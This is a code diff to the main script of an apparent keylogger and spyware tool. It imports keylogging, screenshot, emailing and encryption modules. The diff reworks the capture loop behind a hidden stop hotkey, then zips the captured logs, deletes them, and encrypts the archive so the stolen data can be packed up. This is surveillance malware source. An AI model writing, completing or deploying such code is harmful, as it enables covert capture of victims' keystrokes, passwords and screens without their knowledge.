@@ -1,5 +1,8 @@
 import os
+import time
+
 import keyboard
+import shutil
 import multiprocessing
 from keygrap import Keylogger
 from screenshots import ScreenshotCapture
@@ -10,6 +13,7 @@ from Zipper import Zip
 from mailer import EmailSender
 from Cryptography.KeyGenerator import KeyGenerator
 from Cryptography.EncryptFile import ZipFileEncryptor
+
 
 execute = False
 
@@ -54,24 +58,44 @@ if __name__ == "__main__":
     # Registering the hotkey to stop processes
     keyboard.add_hotkey("ctrl + shift + alt + s", stop_processes)
 
-    if not execute:
-        try:
-            while True:
-                pass # to keep main program running
-        except KeyboardInterrupt:
-            print("user shutdown requested")
-    else:
-        for process in processes:
-            process.terminate()
+    # if not execute:
+    #     try:
+    #         while True:
+    #             pass # to keep main program running
+    #     except KeyboardInterrupt:
+    #         print("user shutdown requested")
+    # else:
+    #     for process in processes:
+    #         process.terminate()
+    #
+    #     for process in processes:
+    #         process.join()
+    #     pass
+
+    try:
+        while True:
+            if not execute:
+                pass  # to keep main program running
+            else:
+                for process in processes:
+                    process.terminate()
+
+                for process in processes:
+                    process.join()
+                break
+    except KeyboardInterrupt:
+        print("user shutdown requested")
 
     # Unregistering the hotkey
     keyboard.remove_hotkey(stop_processes)
 
-
     # Zipping Logs folder and deleting it
     zip = Zip()
     zip.zip_file("../Logs","LogsZip")
-    os.remove("../Logs")
+    # os.remove("../Logs")
+    shutil.rmtree("../Logs") # Remove the "Logs" directory and its contents recursively
+
+    time.sleep(5)
 
     # generating key to encrypt LogsZip file
     key_generator = KeyGenerator()
@@ -79,6 +103,8 @@ if __name__ == "__main__":
 
     # Encrypting LogsZip zip file
     encrypt = ZipFileEncryptor(key)
-    encrypt.encrypt_file("../LogsZip","../ELogsZip")
-    os.remove("../LogsZip")
+    encrypt.encrypt_file("../LogsZip.zip","../ELogsZip.zip")
+    os.remove("../LogsZip.zip")
+
+    exit()
 
